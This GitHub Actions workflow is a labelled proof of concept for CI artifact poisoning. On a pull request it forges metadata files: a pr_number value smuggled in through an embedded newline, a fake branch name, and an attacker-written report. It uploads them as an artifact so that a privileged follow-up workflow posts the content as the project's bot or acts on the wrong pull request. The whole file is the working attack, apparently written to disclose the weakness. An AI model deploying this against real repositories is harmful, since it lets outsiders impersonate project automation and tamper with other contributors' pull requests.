name: Binary Size Report

on:
  pull_request:

jobs:
  run:
    name: Binary Size Report
    runs-on: ubuntu-latest
    steps:
      - name: Attacker controlled metadata and report
        shell: bash
        run: |
          mkdir -p pr-data
          printf '1\npr_number=424242\n' > pr-data/pr_number.txt
          printf 'main\n' > pr-data/base_ref.txt
          printf 'attacker-branch\n' > pr-data/head_ref.txt
          printf '<!-- binary-size-report -->\n### POC: attacker-controlled body posted as patina-automation[bot]\n' > pr-data/binary_size_report.md

      - name: Upload PR Data and Report
        uses: actions/upload-artifact@v7
        with:
          name: binary-size-report-data
          path: pr-data/
          retention-days: 1
